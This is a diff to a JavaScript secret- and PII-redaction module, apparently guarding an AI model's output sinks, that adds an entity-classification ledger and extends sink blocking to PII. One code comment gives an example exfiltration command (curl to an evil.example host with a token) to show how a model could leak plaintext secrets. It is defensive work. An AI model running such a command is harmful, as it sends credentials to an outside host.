@@ -90,13 +90,6 @@ export function isProtectedTokenLike(value) {
   return typeof value === "string" && PROTECTED_TOKEN_LIKE_RE.test(value);
 }
 
-export const ENTITY_CLASS = Object.freeze({
-  CREDENTIAL: "CREDENTIAL",
-  PII: "PII",
-  INFRA: "INFRA",
-  UNKNOWN: "UNKNOWN",
-});
-
 export const RESTORE_ACTION = Object.freeze({
   RESTORE: "restore",
   PRESERVE: "preserve",
@@ -178,18 +171,22 @@ export class ForeignTokenRegistry {
   get size() { return this.namespaces.length + this.tokens.size; }
 }
 
-// "I do not know" and "I know it is a credential" are DIFFERENT states and must
-// stay distinguishable: telemetry and the future classifier both depend on the
-// difference. The default class is therefore UNKNOWN, and it is the POLICY that
-// treats UNKNOWN as credential-grade risk on a sensitive sink (fail-closed).
+// Whether an entity class requires protection at a sensitive sink.
 //
-// Guessing "not sensitive" would restore a secret into an egress path; guessing
-// "sensitive" at worst keeps a token in place and records telemetry.
-export function isCredentialRisk(entityClass) {
+// Renamed from `isCredentialRisk`: the predicate was never about credentials alone. Its
+// OLD body returned false for PII, which was a latent hazard -- once the classifier
+// starts labelling an email, a phone number, a national id or a bank card as PII, those
+// entities would have been RELEASED into a sensitive sink precisely because they were
+// classified correctly.
+//
+// "I do not know" and "I know it is sensitive" remain different states: the default
+// class is UNKNOWN, and the POLICY is what treats UNKNOWN as sensitive (fail-closed).
+export function requiresSinkProtection(entityClass) {
   return entityClass === undefined
     || entityClass === null
     || entityClass === ENTITY_CLASS.UNKNOWN
-    || entityClass === ENTITY_CLASS.CREDENTIAL;
+    || entityClass === ENTITY_CLASS.CREDENTIAL
+    || entityClass === ENTITY_CLASS.PII;
 }
 
 /**
@@ -291,7 +288,7 @@ export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" }, 
     const { ownership, namespace, token } = classifyOwnership(visible, ctx, registry);
     if (ownership === TOKEN_OWNERSHIP.UNKNOWN) continue;
     if (sensitive && !trusted && ownership === TOKEN_OWNERSHIP.OWN
-      && isCredentialRisk(ctx.entityClassFor?.(token))) {
+      && requiresSinkProtection(ctx.entityClassFor?.(token))) {
       return {
         action: RESTORE_ACTION.BLOCK,
         text,
@@ -337,7 +334,7 @@ export function classifyRestore({ ctx, text, sink = { kind: "assistant_text" }, 
       // untrusted sensitive sink is an egress channel, because the model can emit
       // `curl https://evil.example/?x=<token>` and have this layer hand over the
       // plaintext.
-      if (sensitive && !trusted && isCredentialRisk(ctx.entityClassFor?.(token))) {
+      if (sensitive && !trusted && requiresSinkProtection(ctx.entityClassFor?.(token))) {
         return {
           action: RESTORE_ACTION.BLOCK,
           text,
@@ -971,6 +968,76 @@ function looksLikeReferenceValue(raw) {
 // round trip work -- the visible surrogate is registered explicitly, and a lookup is
 // attempted only for strings the ledger actually minted. Decoding arbitrary
 // base64-looking text would be a much larger误伤面 and is deliberately not done.
+
+// ------------------------------------------------------------- entity ledger ----
+//
+// E1: classification RECORDS, it does not decide. The redaction verdict is already made
+// by the time an entity is emitted; this ledger answers "what did we call it, and on
+// what evidence" without feeding back into whether it was redacted.
+//
+// Classification happens AT EMIT TIME on purpose: that is when the span still carries
+// its detector, ruleId, evidence, syntax, key and path. Re-deriving a class later from
+// the token alone would be guesswork.
+
+export const ENTITY_CLASS = Object.freeze({
+  CREDENTIAL: "CREDENTIAL",
+  PII: "PII",
+  INFRA: "INFRA",
+  UNKNOWN: "UNKNOWN",
+});
+
+// Detector types that are PII by construction.
+const PII_DETECTORS = new Set(["email", "phone", "identity", "bank"]);
+
+// Only high-confidence, deterministic signals are mapped in this first revision. An
+// entropy hit is NOT evidence of a class: "looks random" is compatible with a secret, a
+// git SHA, a Docker digest and a trace id alike, which is exactly what the infra
+// recogniser slice will have to disentangle. Leaving those UNKNOWN keeps the
+// misclassification surface from growing in the name of coverage.
+function classifyEntityClass(evidence = {}) {
+  const detector = evidence.detector || "";
+  if (PII_DETECTORS.has(detector)) return ENTITY_CLASS.PII;
+  // A provider rule that fired on a known credential shape, or a private key.
+  if (detector === "gitleaks" && evidence.ruleId) return ENTITY_CLASS.CREDENTIAL;
+  // `sk-` prefixed provider secret.
+  if (detector === "secret") return ENTITY_CLASS.CREDENTIAL;
+  // A strong binding whose key name is a secret name.
+  if (evidence.strength === KEY_STRENGTH.STRONG) return ENTITY_CLASS.CREDENTIAL;
+  if (evidence.syntax === "http-header") return ENTITY_CLASS.CREDENTIAL;
+  if ((evidence.evidence || []).includes("block_scalar_body")) return ENTITY_CLASS.UNKNOWN;
+  // INFRA is deliberately NOT inferred from "looks like a resource id" here; that waits
+  // for the infra recogniser so the guess does not enter policy by the back door.
+  return ENTITY_CLASS.UNKNOWN;
+}
+
+export class EntityLedger {
+  constructor() { this.byToken = new Map(); }
+  record(token, meta) {
+    if (this.byToken.has(token)) return this.byToken.get(token);
+    const entityClass = classifyEntityClass(meta);
+    const entry = {
+      token,
+      entityClass,
+      detector: meta.detector ?? null,
+      ruleId: meta.ruleId ?? null,
+      evidence: meta.evidence ? [...meta.evidence] : [],
+      syntax: meta.syntax ?? null,
+      key: meta.key ?? null,
+      pathSegments: meta.pathSegments ? [...meta.pathSegments] : null,
+      // Coverage is recorded as an INDEPENDENT dimension, never folded into a single
+      // confidence number and never used to downgrade a deterministic detector:
+      // "the parser could not locate the structure" and "the detector is unsure" are
+      // different statements. A GitHub PAT inside a FAILED region is still a PAT.
+      coverageStatus: meta.coverageStatus ?? null,
+      encodingKind: meta.encodingKind ?? ENCODING_KIND.PLAIN,
+    };
+    this.byToken.set(token, entry);
+    return entry;
+  }
+  get(token) { return this.byToken.get(token) || null; }
+  get size() { return this.byToken.size; }
+  entries() { return [...this.byToken.values()]; }
+}
 
 export const ENCODING_KIND = Object.freeze({
   PLAIN: "plain",
@@ -1816,6 +1883,10 @@ export function bindingSpansOf(text, kind = "binding", parser = parseBindings, c
       normalizedKey: b.normalizedKey,
       syntax: b.syntax,
       evidence: b.evidence,
+      // Carried through for the entity classifier: without it, a strong binding loses
+      // its strength in transit and every `DB_PASSWORD=...` classifies as UNKNOWN.
+      strength: b.strength,
+      ...(b.headerName ? { headerName: b.headerName } : {}),
       ...(b.pathSegments ? { pathSegments: b.pathSegments, pathConfidence: b.pathConfidence, indent: b.indent } : {}),
     }));
 }
@@ -2021,6 +2092,18 @@ export function findSensitiveSpans(text, flags, deps = {}) {
 
 export class RedactionLimitError extends Error {}
 
+/**
+ * Coverage status of the region a span came from, if the caller collected coverage.
+ * Recorded alongside the class as an INDEPENDENT dimension -- it is deliberately not
+ * merged into a confidence score and never downgrades a deterministic detector.
+ */
+function coverageStatusForSpan(spans, span) {
+  const attempts = spans.coverage?.attempts;
+  if (!attempts) return null;
+  const hit = attempts.find((a) => span.start >= a.regionStart && span.end <= a.regionEnd);
+  return hit ? hit.status : null;
+}
+
 function randomTokenChars(n) {
   const bytes = new Uint8Array(n);
   crypto.getRandomValues(bytes);
@@ -2052,6 +2135,9 @@ export class RedactionContext {
     this.ledger = new SurrogateLedger();
     // Request-level parser coverage rollup (observability only; never gates redaction).
     this.coverage = [];
+    // E1 entity classification ledger. Populated at emit time; consumed read-only by
+    // entityClassFor(), which is what the sink policy asks.
+    this.entityLedger = new EntityLedger();
     // Eligibility for protected spans: a token is protected only if this request
     // minted or registered it (including re-minted legacy tokens). Shape alone is
     // never sufficient, otherwise a CRG-looking label would smuggle a secret past
@@ -2090,6 +2176,41 @@ export class RedactionContext {
    * Publish an entity, optionally through a representation-constrained surrogate.
    * `match` is the token a caller already knows, or the raw plaintext.
    */
+  /**
+   * Record what an entity was classified as, at emit time, while the span still carries
+   * its detector/evidence/context. Never re-derived later from the token.
+   */
+  recordEntity(token, spanMeta = {}, encodingKind = ENCODING_KIND.PLAIN) {
+    // Attribute to the MOST SPECIFIC detector that participated, not to whatever type
+    // the merge happened to leave on the span. A provider rule that fired inside a
+    // wider binding is the real evidence, even when the span's own type says otherwise.
+    const absorbed = Array.isArray(spanMeta.absorbed) ? spanMeta.absorbed : [];
+    const candidates = [spanMeta.type, ...absorbed].filter(Boolean);
+    const detector = spanMeta.ruleId
+      ? "gitleaks"
+      : candidates.find((t) => t !== "entropy" && t !== "block_scalar")
+        || candidates[0]
+        || "binding";
+    return this.entityLedger.record(token, {
+      detector,
+      ruleId: spanMeta.ruleId ?? null,
+      evidence: spanMeta.evidence ?? [],
+      // The classifier reads this to recognise a strong binding; omitting it here made
+      // every `DB_PASSWORD=...` classify as UNKNOWN even though the span carried it.
+      strength: spanMeta.strength ?? null,
+      syntax: spanMeta.syntax ?? null,
+      key: spanMeta.key ?? null,
+      pathSegments: spanMeta.pathSegments ?? null,
+      coverageStatus: spanMeta.coverageStatus ?? null,
+      encodingKind,
+    });
+  }
+
+  /** E1: the classifier does not change verdicts; it only answers what a token was. */
+  entityClassFor(token) {
+    return this.entityLedger.get(token)?.entityClass ?? ENTITY_CLASS.UNKNOWN;
+  }
+
   async emit(match, encodingKind = ENCODING_KIND.PLAIN) {
     // Ownership decides, never shape. An earlier revision returned any TOKEN_FULL_RE
     // match verbatim, which meant an arbitrary token-SHAPED literal passed straight
@@ -2126,7 +2247,14 @@ export class RedactionContext {
     let out = "", at = 0;
     for (const s of spans) {
       out += text.slice(at, s.start);
-      out += await this.emit(text.slice(s.start, s.end), s.schemaEncoding || ENCODING_KIND.PLAIN);
+      const raw = text.slice(s.start, s.end);
+      const encodingKind = s.schemaEncoding || ENCODING_KIND.PLAIN;
+      const visible = await this.emit(raw, encodingKind);
+      const token = resolveSurrogate(visible, this);
+      // Recorded BEFORE any verdict could change, so telemetry and the enforcement path
+      // see the same classification.
+      this.recordEntity(token, { ...s, coverageStatus: coverageStatusForSpan(spans, s) }, encodingKind);
+      out += visible;
       at = s.end;
     }
     return out + text.slice(at);
